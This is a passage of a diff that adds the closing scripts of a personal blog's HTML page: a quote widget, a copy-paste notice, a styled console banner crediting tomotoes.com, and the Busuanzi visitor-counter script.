+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "0xxk");
+
+
+/* 控制台 */
+if (window.console && window.console.log) {
+	setTimeout(function () {
+		console.log("\n %c 一个坏掉的番茄 %c  © Simon Ma  http://tomotoes.com \n\n", "color:#FFFFFB;background:#1abc9c;padding:5px 0;border-radius:.5rem 0 0 .5rem;", "color:#FFFFFB;background:#080808;padding:5px 0;border-radius:0 .5rem .5rem 0;");
+	}, 0);
+}
+
+</script>
+
+
+
+
+<!-- 公式渲染 -->
+
+
+
+<!-- 不蒜子 -->
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+
+</body>
+</html>
